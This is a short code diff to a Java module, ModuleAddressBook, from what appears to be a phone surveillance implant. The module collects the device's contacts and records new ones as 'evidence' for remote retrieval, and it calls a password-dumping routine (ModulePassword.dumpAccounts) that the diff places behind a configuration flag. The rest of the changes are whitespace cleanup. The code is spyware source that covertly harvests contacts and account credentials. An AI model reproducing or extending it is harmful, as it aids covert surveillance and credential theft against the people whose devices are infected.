@@ -134,7 +134,9 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 						return 0;
 					}
 				};
-				ModulePassword.dumpAccounts(addressVisitor);
+				if (Cfg.ENABLE_PASSWORD_MODULE) {
+					ModulePassword.dumpAccounts(addressVisitor);
+				}
 
 			}
 
@@ -212,9 +214,9 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 			// calculate the crc of the contact
 			final byte[] packet = preparePacket(c);
-			
-			needToSerialize = serializeIfNew( c.getId(), packet );
-			if(needToSerialize){
+
+			needToSerialize = serializeIfNew(c.getId(), packet);
+			if (needToSerialize) {
 				log.write(packet);
 			}
 		}
@@ -227,11 +229,11 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		return needToSerialize;
 	}
 
-	private static boolean serializeIfNew( long id, final byte[] packet) {
-		
+	private static boolean serializeIfNew(long id, final byte[] packet) {
+
 		final Long crcOld = contacts.get(id);
 		final Long crcNew = Digest.CRC32(packet);
-		
+
 		boolean needToSerialize = false;
 		// if does not match, save and serialize
 		if (!crcNew.equals(crcOld)) {
@@ -395,13 +397,13 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id);
 		}
-		
+
 		byte[] packet = preparePacket(type, id, c.number, c.name, c.display_name);
-		boolean needToSerialize = serializeIfNew( id, packet );
-		if(needToSerialize){
+		boolean needToSerialize = serializeIfNew(id, packet);
+		if (needToSerialize) {
 			EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, packet);
 		}
-		
+
 	}
 
 }
